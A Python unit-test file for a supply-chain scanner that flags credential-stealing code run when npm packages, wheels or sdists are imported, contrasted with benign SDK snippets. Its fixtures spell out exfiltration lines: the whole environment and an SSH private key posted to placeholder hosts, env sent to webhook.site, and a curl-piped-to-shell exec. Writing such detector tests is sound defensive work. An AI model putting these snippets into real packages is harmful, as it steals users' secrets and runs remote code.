"""Code that runs when a package is loaded gets a weaker install-script test.

install_script_risk (the environment or credentials sent over the network,
an exfiltration service, a download piped into a shell) ran on install-time
scripts only, so an import-time stealer — in the files an npm package's
main, bin or exports reach, or a wheel's x/__init__.py — was judged only by
the generic rules. Those files now get a weaker version, SC-IMPORT-RISK,
narrower because this is where ordinary SDK code lives: reading one
variable, listing variables with a prefix, contacting a cloud metadata
address or naming its own service must not count. Only the whole
environment serialized or a credential store read, next to a network call
or a named exfiltration service in the same file, and a download piped into
a shell by an exec call. MAJOR (WARN), except the shapes no library needs
(audit P0, 0.1.7: import_time_severity): a download run through a shell,
credentials sent to a named exfiltration service — CRITICAL
(test_import_time_signals.py has the rest).

Payloads are inert: hosts are .invalid or 192.0.2.x (TEST-NET).
"""

import unittest

from lazaret.registry import repo
from tests.registry._review_support import (
    EXFIL_JS, hooks, issues, manifest, scan_npm, scan_sdist, scan_wheel)

WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
ENV_TO_COLLECTOR_PY = ("import os, json, urllib.request\n"
                       "urllib.request.urlopen('https://collector.invalid/c', "
                       "data=json.dumps(dict(os.environ)).encode())\n")
SSH_KEY_TO_IP_PY = ("import os, requests\n"
                    "requests.post('http://192.0.2.1/k', "
                    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n")

# Shapes of ordinary SDK and CLI code: none of these is a finding
SDK_JS = {
    "api client": ("const https = require('https');\n"
                   "const API_KEY = process.env.EXAMPLE_API_KEY;\n"
                   "function request(path, body) {\n"
                   "  const req = https.request({host: 'api.example.invalid', path, method: 'POST',\n"
                   "    headers: {Authorization: `Bearer ${API_KEY}`}});\n"
                   "  req.end(JSON.stringify(body));\n"
                   "}\nmodule.exports = {request};\n"),
    "prefixed settings": ("const settings = Object.fromEntries(Object.entries(process.env)\n"
                          "  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
                          "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
                          "{headers: {'x-sdk': JSON.stringify(settings)}});\n"),
    "cloud metadata": ("const http = require('http');\n"
                       "const METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
                       "module.exports = (cb) => http.get(METADATA, cb);\n"),
    "bot api client": ("const https = require('https');\n"
                       "const BASE = 'https://api.telegram.org/bot';\n"
                       "module.exports = (token, method, payload) => https.request(BASE + token + '/' "
                       "+ method, {method: 'POST'}).end(JSON.stringify(payload));\n"),
    "install hint": ("console.log('Install the toolchain with: "
                     "curl -fsSL https://sh.example.invalid/install.sh | sh');\n"),
    "public key": ("const fs = require('fs'), os = require('os'), path = require('path');\n"
                   "const https = require('https');\n"
                   "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
                   "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n"),
}
SDK_PY = {
    "api client": ("import os\nimport requests\n"
                   "API_URL = os.environ.get('EXAMPLE_API_URL', 'https://api.example.invalid')\n"
                   "session = requests.Session()\n\ndef ping():\n"
                   "    return session.get(API_URL + '/ping', timeout=5)\n"),
    "subprocess env": ("import os, subprocess, urllib.request\n\ndef build(cmd):\n"
                       "    env = os.environ.copy()\n    env['EXAMPLE_MODE'] = '1'\n"
                       "    return subprocess.run(cmd, env=env, check=True)\n\n"
                       "def fetch(url, dest):\n    urllib.request.urlretrieve(url, dest)\n"),
    "env listing": ("import os\nimport httpx\n"
                    "OPTIONS = {k: v for k, v in os.environ.items() if k.startswith('EXAMPLE_')}\n"
                    "client = httpx.Client(base_url='https://api.example.invalid')\n"),
}


def import_risk(res):
    return [(i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK")]


class NpmImportTimeTests(unittest.TestCase):
    def test_a_file_main_reaches(self):
        res = scan_npm({"package.json": manifest(), "index.js": "require('./lib/telemetry');\n",
                        "lib/telemetry.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [("lib/telemetry.js", "MAJOR")])
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
        hit = issues(res, "SC-IMPORT-RISK")[0]
        self.assertEqual(hit["line"], 2)                     # the JSON.stringify(process.env) line
        self.assertIn("runs when the package is loaded", hit["msg"])

    def test_never_critical(self):
        res = scan_npm({"package.json": manifest(main="dist/index.js"), "dist/index.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [("dist/index.js", "MAJOR")])
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])

    def test_a_bin_reading_an_ssh_key(self):
        res = scan_npm({"package.json": manifest(bin={"x": "bin/x.js"}),
                        "bin/x.js": ("const fs = require('fs');\n"
                                     "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"
                                     "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n")})
        self.assertEqual(import_risk(res), [("bin/x.js", "MAJOR")])

    def test_a_named_service_without_a_known_network_call(self):
        res = scan_npm({"package.json": manifest(),
                        "index.js": ("const data = JSON.stringify(process.env);\n"
                                     "module.exports = (send) => send("
                                     "'https://webhook.site/00000000-0000-0000-0000-000000000000', data);\n")})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # sent to a named service

    def test_a_download_piped_into_a_shell_by_exec(self):
        res = scan_npm({"package.json": manifest(),
                        "index.js": ("const {execSync} = require('child_process');\n"
                                     "execSync('curl -s https://files.invalid/x.sh | sh');\n")})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # fetch-and-run
        self.assertIn("runs a downloaded script through a shell",
                      issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_install_scripts_keep_their_own_test(self):
        res = scan_npm({"package.json": hooks(postinstall="node install.js"), "install.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [])
        self.assertEqual(issues(res, "SC-INSTALL-HOOK")[0]["sev"], "CRITICAL")

    def test_ordinary_sdk_code_is_not_a_finding(self):
        for label, text in SDK_JS.items():
            with self.subTest(label):
                res = scan_npm({"package.json": manifest(), "index.js": text})
                self.assertEqual(import_risk(res), [])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_unreached_files_are_not_import_time_code(self):
        res = scan_npm({"package.json": manifest(), "index.js": "module.exports = 1;\n",
                        "scripts/release.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [])


class WheelImportTimeTests(unittest.TestCase):
    def test_top_level_packages_and_modules(self):
        for rel, text in (("x/__init__.py", ENV_TO_COLLECTOR_PY), ("evil.py", SSH_KEY_TO_IP_PY),
                          ("x-1.0.data/purelib/y/__init__.py", ENV_TO_COLLECTOR_PY)):
            with self.subTest(rel=rel):
                res = scan_wheel({**WHEEL_META, rel: text})
                self.assertEqual(import_risk(res), [(rel, "MAJOR")])
                self.assertEqual(res["verdict"], "WARN", res["verdictReason"])

    def test_deeper_modules_are_not_checked(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "", "x/util.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [])

    def test_ordinary_sdk_code_is_not_a_finding(self):
        for label, text in SDK_PY.items():
            with self.subTest(label):
                res = scan_wheel({**WHEEL_META, "x/__init__.py": text})
                self.assertEqual(import_risk(res), [])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_start_up_modules_keep_their_own_test(self):
        res = scan_wheel({**WHEEL_META, "sitecustomize.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [])
        self.assertEqual([i["sev"] for i in issues(res, "SC-SITECUSTOMIZE")], ["CRITICAL"])

    def test_an_sdists_modules_get_the_test_too(self):
        # an sdist's package runs when it is imported, like a wheel's (0.1.7:
        # it used to be judged by its install scripts alone)
        res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x')\n",
                          "x/__init__.py": ENV_TO_COLLECTOR_PY, "tests/test_x.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [("x/__init__.py", "MAJOR")])


class WeakerThanTheInstallTestTests(unittest.TestCase):
    def test_what_only_the_install_test_counts(self):
        for text in (SDK_JS["prefixed settings"], SDK_JS["cloud metadata"], SDK_JS["bot api client"],
                     SDK_PY["subprocess env"], SDK_PY["env listing"]):
            with self.subTest(text=text[:40]):
                self.assertTrue(repo.install_script_risk(text))
                self.assertEqual(repo.import_time_risk(text), ([], None))


if __name__ == "__main__":
    unittest.main()
